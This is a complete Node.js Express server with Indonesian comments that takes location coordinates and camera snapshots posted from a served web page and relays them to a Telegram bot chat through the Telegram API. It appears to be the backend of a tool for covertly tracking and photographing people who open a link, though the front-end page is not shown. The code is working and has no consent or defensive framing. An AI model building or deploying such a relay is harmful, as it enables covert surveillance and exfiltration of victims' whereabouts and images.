const express = require("express");

const app = express();
app.use(express.json({ limit: "20mb" }));
app.use(express.static("public"));

// 🔐 Ambil dari environment (Secrets Replit)
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// Debug cek token
if (!BOT_TOKEN || !CHAT_ID) {
  console.log("❌ BOT_TOKEN / CHAT_ID belum di-set di Secrets");
}

// 📍 LOCATION → kirim ke Telegram
app.post("/location", async (req, res) => {
  try {
    const { lat, lon, acc } = req.body;

    const text = `📍 Lokasi:
Lat: ${lat}
Lon: ${lon}
Akurasi: ${acc}`;

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text
      })
    });

    res.json({ ok: true });

  } catch (err) {
    console.log("Error location:", err);
    res.status(500).send("Error");
  }
});

// 📷 CAMERA → kirim ke Telegram
app.post("/camsnap", async (req, res) => {
  try {
    const { image } = req.body;

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        photo: image
      })
    });

    res.json({ ok: true });

  } catch (err) {
    console.log("Error cam:", err);
    res.status(500).send("Error");
  }
});

app.get("/", (req, res) => {
  res.send("Server aktif");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("🚀 Server running on port", PORT);
});
